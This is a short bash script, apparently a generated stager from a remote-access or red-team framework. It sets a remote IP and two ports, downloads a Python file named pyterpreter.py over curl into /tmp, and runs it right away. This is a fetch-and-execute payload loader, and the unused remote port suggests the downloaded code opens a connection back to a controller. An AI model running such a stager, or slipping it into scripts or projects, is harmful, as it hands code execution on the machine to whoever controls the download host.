#!/bin/bash
export REMOTE_IP=127.0.0.1  # auto_generated
export REMOTE_PORT=50000
export RESOURCES_PORT=1338

curl $REMOTE_IP:$RESOURCES_PORT/pyterpreter.py > /tmp/pyterpreter.py
python3 /tmp/pyterpreter.py
